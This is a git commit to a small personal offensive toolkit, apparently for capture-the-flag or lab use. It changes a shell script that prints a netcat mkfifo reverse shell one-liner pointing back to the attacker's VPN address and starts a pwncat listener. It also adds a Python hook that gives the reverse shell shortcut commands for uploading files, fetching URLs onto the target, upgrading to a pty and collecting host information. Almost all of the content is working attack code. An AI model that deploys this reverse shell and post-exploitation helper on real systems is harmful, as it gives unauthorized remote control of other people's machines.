3475b1af53fbcf0a1798ebc4757e2881dfb16bcb
Douile <25043847+Douile@users.noreply.github.com>
2021-06-26 15:14:43 +0100

    Add custom commands to reverse shell

--- hak.sh
+++ hak.sh
@@ -1,6 +1,7 @@
 #!/bin/sh
 
 _VPN="tun0"
+_HAKDIR=$(readlink -f "$(dirname "$0")")
 
 tunip() {
   if i=$(ip addr show dev "$_VPN" 2>/dev/null); then
@@ -14,9 +15,9 @@ rev() {
   ip=$(tunip "0.0.0.0")
   port="${1:=1337}"
   echo "rm /tmp/p;mkfifo /tmp/p;nc ${ip} ${port} 0</tmp/p|/bin/sh > /tmp/p 2>&1;rm /tmp/p"
-  echo "https://douile.github.io/reverse-shell-generator/#ip=${ip}&port=${port}"
+  echo "https://revshells.com/#ip=${ip}&port=${port}"
   # shellcheck disable=SC2068,SC3057
-  command pwncat -vv -l "$ip" "$port"
+  command pwncat --script-send "$_HAKDIR/pwnse.py" -vv -l "$ip" "$port"
 }
 
 scan() {
---
+++ pwnse.py
@@ -0,0 +1,55 @@
+#!/usr/bin/env python3
+
+
+def transform(data, pse):
+    def escape(data):
+        return data.replace(b'$', b'\\$').replace(b'`',b'\\`')
+    def upload(parts, pse):
+        content = None
+        with open(parts[1], 'rb') as f:
+            content = f.read()
+        print('Uploading {}...'.format(parts[1]))
+        return b'cat <<EOS > ' + parts[1] + b'\n' + escape(content) + b'\nEOS\n'
+    def download(parts, pse):
+        import requests
+        r = requests.get(parts[1])
+        print('Downloading {} to {}...'.format(parts[1], parts[2]))
+        return b'cat <<EOS > ' + parts[2] + b'\n' + escape(r.content) + b'\nEOS\n'        
+    def upgrade(parts, pse):
+        print('python -c \'import pty;pty.spawn("/bin/sh")\'')
+        return b'python -c \'import pty;pty.spawn("/bin/sh")\'\n'
+    def info(parts, pse):
+        return b'cat <<EOF\npwd\t$(pwd)\nid\t$(id)\nuname\t$(uname -a)\ndist\t$(lsb_release -a)\nEOF\n'
+    def chelp(parts, pse):
+        print('pwnse help')
+        print('@help\t\t\t\tGet help')
+        print('@ping\t\t\t\tPing, pong')
+        print('@i(nfo)\t\t\t\tGet info on remote host')
+        print('@u(pload) [file]\t\tUpload a file')
+        print('@d(ownload) [url] [name]\tDownload a url to specified file')
+        print('@up(grade)\t\t\tUpgrade to a tty with python')
+        return b''
+
+    cmds = {}
+    cmds[b'ping'] = lambda parts, pse: b'echo pong\n'
+    cmds[b'i'] = info
+    cmds[b'info'] = info
+    cmds[b'u'] = upload
+    cmds[b'upload'] = upload
+    cmds[b'd'] = download
+    cmds[b'download'] = download
+    cmds[b'up'] = upgrade
+    cmds[b'upgrade'] = upgrade
+    cmds[b'?'] = chelp
+    cmds[b'help'] = chelp
+
+    if data.startswith(b'@'):
+        parts = data[1:-1].split(b' ')
+        if parts[0] in cmds:
+            return cmds[parts[0]](parts, pse)
+        elif parts[0].startswith(b'@'):
+            return b' '.join(parts) + b'\n'
+        else:
+            print('Unknown command @{}'.format(str(parts[0], 'utf8')))
+            return b''
+    return data
